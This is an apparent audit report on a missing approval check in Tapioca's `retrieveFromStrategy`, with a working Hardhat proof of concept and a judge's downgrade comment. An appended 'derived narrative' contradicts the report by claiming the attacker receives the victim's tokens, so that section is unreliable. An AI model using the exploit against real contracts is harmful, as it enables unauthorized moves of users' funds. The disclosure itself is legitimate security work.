---
id: 19085
severity: "High"
---

# `BaseTOFT.sol`: `retrieveFromStrategy` can be used to manipulate other user’s positions due to absent approval check

## Description

The function `retrieveFromStrategy` is used to trigger a removal of TOFT tokens from a strategy on a different chain. The function takes the parameter `from`, which is the account whose tokens will be retrieved.

The main issue is that anyone can call this function with any address passed to the `from` parameter. There is no allowance check on the chain, allowing this operation. Let’s walk through the steps to see how this is executed.

`BaseTOFT.sol`:`retrieveFromStrategy` is called by the attacker with a `from` address of the victim. This function calls the `retrieveFromStrategy` function in the strategy module.

```solidity
_executeModule(
    Module.Strategy,
    abi.encodeWithSelector(
        BaseTOFTStrategyModule.retrieveFromStrategy.selector,
        from,
        amount,
        share,
        assetId,
        lzDstChainId,
        zroPaymentAddress,
        airdropAdapterParam
    ),
    false
);
```

`BaseTOFTStrategyModule.sol`:`retrieveFromStrategy` is called. This function packs some data and sends it forward to the lz endpoint. Point to note, is that no approval check is done for the `msg.sender` of this whole setup yet.

```solidity
bytes memory lzPayload = abi.encode(
    PT_YB_RETRIEVE_STRAT,
    LzLib.addressToBytes32(_from),
    toAddress,
    amount,
    share,
    assetId,
    zroPaymentAddress
);
// lzsend(...)
```

After the message is sent, the **lzendpoint** on the receiving chain will call the TOFT contract again. Now, the `msg.sender` is **not** the attacker, but is instead the lzendpoint! The endpoint call gets delegated to the `strategyWithdraw` function in the Strategy module.

```solidity
(
    ,
    bytes32 from,
    ,
    uint256 _amount,
    uint256 _share,
    uint256 _assetId,
    address _zroPaymentAddress
) = abi.decode(
        _payload,
        (uint16, bytes32, bytes32, uint256, uint256, uint256, address)
    );
```

Here we see the unpacking. Note that the second unpacked value is put in the `from` field. This is an address determined by the attacker and passed through the layerzero endpoints. The contract then calls `_retrieveFromYieldBox` to take out tokens from the Yieldbox. They are then sent cross chain back to the `from` address.

```solidity
_retrieveFromYieldBox(_assetId, _amount, _share, _from, address(this));
_debitFrom(
    address(this),
    lzEndpoint.getChainId(),
    LzLib.addressToBytes32(address(this)),
    _amount
);
bytes memory lzSendBackPayload = _encodeSendPayload(
    from,
    _ld2sd(_amount)
);
_lzSend(
    _srcChainId,
    lzSendBackPayload,
    payable(this),
    _zroPaymentAddress,
    "",
    address(this).balance
);
```

Thus it is evident from this call that the YieldBox contract being called has no idea that the original sender was the attacker. Instead, for the YieldBox contract, the `msg.sender` is the current TOFT contract. If users want to use the cross chain operations, they have to give allowance to the TOFT address. Thus we can assume that the victim has already given allowance to this address. Thus the YieldBox thinks the `msg.sender` is the TOFT contract, who is allowed, and thus executes the operations.

Thus we have demonstrated that the attacker is able to call a function on the victim’s YieldBox position **without** being given any allowance by setting the victim’s address in the `from` field. Thus this is a high severity issue since the victim’s tokens are withdrawn and sent to a different chain without their consent.

## Proof of Concept

Two lines from the test in test/TapiocaOFT.test.ts is changed to show this issue. Below is the full test for reference. The changed bits are marked with arrows.

```solidity
it.only("should be able to deposit & withdraw from a strategy available on another layer", async () => {
    const {
        signer,
        erc20Mock,
        mintAndApprove,
        bigDummyAmount,
        utils,
        randomUser, // @audit <------------------------------------- take other user address
    } = await loadFixture(setupFixture)

    const LZEndpointMock_chainID_0 = await utils.deployLZEndpointMock(
        31337
    )
    const LZEndpointMock_chainID_10 = await utils.deployLZEndpointMock(
        10
    )

    const tapiocaWrapper_0 = await utils.deployTapiocaWrapper()
    const tapiocaWrapper_10 = await utils.deployTapiocaWrapper()

    //Deploy YB and Strategies
    const yieldBox0Data = await deployYieldBox(signer)
    const yieldBox10Data = await deployYieldBox(signer)

    const YieldBox_0 = yieldBox0Data.yieldBox
    const YieldBox_10 = yieldBox10Data.yieldBox

    {
        const txData =
            await tapiocaWrapper_0.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_0.address,
                        erc20Mock.address,
                        YieldBox_0.address,
                        31337,
                        signer
                    )
                ).txData,
                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT0 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_0.tapiocaOFTs(
            (await tapiocaWrapper_0.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    // Deploy TapiocaOFT10
    {
        const txData =
            await tapiocaWrapper_10.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_10.address,
                        erc20Mock.address,
                        YieldBox_10.address,
                        10,
                        signer
                    )
                ).txData,
                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT10 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_10.tapiocaOFTs(
            (await tapiocaWrapper_10.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    const strategy0Data = await deployToftMockStrategy(
        signer,
        YieldBox_0.address,
        tapiocaOFT0.address
    )
    const strategy10Data = await deployToftMockStrategy(
        signer,
        YieldBox_10.address,
        tapiocaOFT10.address
    )

    const Strategy_0 = strategy0Data.tOFTStrategyMock
    const Strategy_10 = strategy10Data.tOFTStrategyMock

    // Setup
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    // Set trusted remotes
    const dstChainId0 = 31337
    const dstChainId10 = 10

    await tapiocaWrapper_0.executeTOFT(
        tapiocaOFT0.address,
        tapiocaOFT0.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId10,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT10.address, tapiocaOFT0.address]
            ),
        ]),
        true
    )

    await tapiocaWrapper_10.executeTOFT(
        tapiocaOFT10.address,
        tapiocaOFT10.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId0,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT0.address, tapiocaOFT10.address]
            ),
        ]),
        true
    )
    // Link endpoints with addresses
    await LZEndpointMock_chainID_0.setDestLzEndpoint(
        tapiocaOFT10.address,
        LZEndpointMock_chainID_10.address
    )
    await LZEndpointMock_chainID_10.setDestLzEndpoint(
        tapiocaOFT0.address,
        LZEndpointMock_chainID_0.address
    )

    //Register tokens on YB
    await YieldBox_0.registerAsset(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    await YieldBox_10.registerAsset(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    const tapiocaOFT0Id = await YieldBox_0.ids(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    const tapiocaOFT10Id = await YieldBox_10.ids(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    expect(tapiocaOFT0Id.eq(1)).to.be.true
    expect(tapiocaOFT10Id.eq(1)).to.be.true

    //Test deposits on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await tapiocaOFT0.approve(
        YieldBox_0.address,
        ethers.constants.MaxUint256
    )
    let toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )
    await YieldBox_0.depositAsset(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toDepositShare
    )

    let yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    let vaultAmount = await Strategy_0.vaultAmount()
    expect(yb0Balance.gt(bigDummyAmount)).to.be.true //bc of the yield
    expect(vaultAmount.eq(bigDummyAmount)).to.be.true

    //Test withdraw on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )
    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw
    const signerBalanceBeforeWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    const toWithdrawShare = await YieldBox_0.balanceOf(
        signer.address,
        tapiocaOFT0Id
    )
    await YieldBox_0.withdraw(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toWithdrawShare
    )
    const signerBalanceAfterWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    expect(
        signerBalanceAfterWithdraw
            .sub(signerBalanceBeforeWithdraw)
            .gt(bigDummyAmount)
    ).to.be.true

    vaultAmount = await Strategy_0.vaultAmount()
    expect(vaultAmount.eq(0)).to.be.true

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(vaultAmount.eq(0)).to.be.true

    const latestBalance = await Strategy_0.currentBalance()
    expect(latestBalance.eq(0)).to.be.true

    toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )

    const totals = await YieldBox_0.assetTotals(tapiocaOFT0Id)
    expect(totals[0].eq(0)).to.be.true
    expect(totals[1].eq(0)).to.be.true

    //Cross chain deposit from TapiocaOFT_10 to Strategy_0
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await expect(
        tapiocaOFT0.sendFrom(
            signer.address,
            10,
            ethers.utils.defaultAbiCoder.encode(
                ["address"],
                [signer.address]
            ),
            bigDummyAmount,
            {
                refundAddress: signer.address,
                zroPaymentAddress: ethers.constants.AddressZero,
                adapterParams: "0x",
            },
            {
                value: ethers.utils.parseEther("0.02"),
                gasLimit: 2_000_000,
            }
        )
    ).to.not.be.reverted
    const signerBalanceForTOFT10 = await tapiocaOFT10.balanceOf(
        signer.address
    )
    expect(signerBalanceForTOFT10.eq(bigDummyAmount)).to.be.true

    const asset = await YieldBox_0.assets(tapiocaOFT0Id)
    expect(asset[2]).to.eq(Strategy_0.address)

    await tapiocaOFT10.sendToStrategy(
        signer.address,
        signer.address,
        bigDummyAmount,
        toDepositShare,
        1, //asset id
        dstChainId0,
        {
            extraGasLimit: "2500000",
            zroPaymentAddress: ethers.constants.AddressZero,
        },
        {
            value: ethers.utils.parseEther("15"),
        }
    )

    let strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.gt(0)).to.be.true

    const yb0BalanceAfterCrossChainDeposit = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(yb0BalanceAfterCrossChainDeposit.gt(bigDummyAmount))

    const airdropAdapterParams = ethers.utils.solidityPack(
        ["uint16", "uint", "uint", "address"],
        [2, 800000, ethers.utils.parseEther("2"), tapiocaOFT0.address]
    )

    await YieldBox_0.setApprovalForAsset(
        tapiocaOFT0.address,
        tapiocaOFT0Id,
        true
    ) //this should be done through Magnetar in the same tx, to avoid frontrunning

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )

    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw

    await hre.ethers.provider.send("hardhat_setBalance", [
        randomUser.address,
        ethers.utils.hexStripZeros(
            ethers.utils.parseEther(String(20))._hex
        ),
    ]) // @audit <------------------------------------------- Fund user
    await tapiocaOFT10
        .connect(randomUser) // @audit <------------------------------------------- Call with other user instead of signer
        .retrieveFromStrategy(
            signer.address,
            yb0BalanceAfterCrossChainDeposit,
            toWithdrawShare,
            1,
            dstChainId0,
            ethers.constants.AddressZero,
            airdropAdapterParams,
            {
                value: ethers.utils.parseEther("10"),
            }
        )
    strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.eq(0)).to.be.true

    const signerBalanceAfterCrossChainWithdrawal =
        await tapiocaOFT10.balanceOf(signer.address)
    expect(signerBalanceAfterCrossChainWithdrawal.gt(bigDummyAmount)).to
        .be.true
})
```

The only relevant change is that the function `retrieveFromStrategy` is called from another address. The test passes, showing that an attacker, in this case `randomUser` can influence the operations of the victim, the `signer`.

## Recommendation

Add an allowance check for the `msg.sender` in the `strategyWithdraw` function.

Should be medium. Although annoying, attacker can’t steal the user’s asset, and will have to pay gas without profit for both chains in order to do this trick. Should be grouped in #1037.

Same answer as https://github.com/code-423n4/2023-07-tapioca-findings/issues/1009.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an authorization bypass in the cross‑chain function retrieveFromStrategy of the BaseTOFT contract. The function accepts a parameter named from, which is intended to identify the account whose tokens are to be retrieved from a strategy on another chain. However, the implementation does not verify that the caller is authorized to act on behalf of the from address. Because the call is forwarded through a LayerZero endpoint, the msg.sender seen by the YieldBox contract is the TOFT contract itself, which already holds an allowance from any user that has previously approved cross‑chain operations. Consequently, an attacker can invoke retrieveFromStrategy with an arbitrary victim address, causing the YieldBox to debit the victim’s position and send the tokens to the attacker’s chosen destination chain without the victim’s consent. The exploit proceeds as follows: an attacker calls retrieveFromStrategy on the TOFT contract, passing the victim’s address as the from argument; the call is encoded and sent via the LayerZero endpoint; on the destination chain the endpoint invokes the strategyWithdraw function, which unpacks the attacker‑supplied from address and calls _retrieveFromYieldBox, which treats the TOFT contract as an authorized spender and transfers the victim’s assets; the assets are then sent back across the bridge to the attacker’s address. This results in the victim’s balance in the YieldBox dropping unexpectedly, often to zero, while the attacker receives the withdrawn tokens on another chain. The issue manifests whenever a user has granted allowance to the TOFT contract for cross‑chain operations, which is a normal prerequisite for legitimate use. It was discovered during a manual audit that traced the data flow of retrieveFromStrategy and noticed the absence of any allowance or ownership check on the from parameter. The bug is subtle because the LayerZero endpoint masks the original caller, making it appear as a trusted contract call, and because the contract’s normal operation requires users to approve the TOFT contract, leading auditors to assume the allowance check was implicit. The vulnerability belongs to the class of missing access‑control checks, specifically an authorization bypass in a cross‑chain messaging context. To remediate, the strategyWithdraw (or the retrieveFromStrategy entry point) should enforce that the caller is either the token owner or an address explicitly approved by the owner, typically by checking the allowance mapping against the from address before performing any YieldBox debit. Implementing such a check would align the contract’s behavior with the expected business logic that only the token holder or an authorized operator may trigger a withdrawal, thereby preventing unauthorized token extraction and preserving user balances.
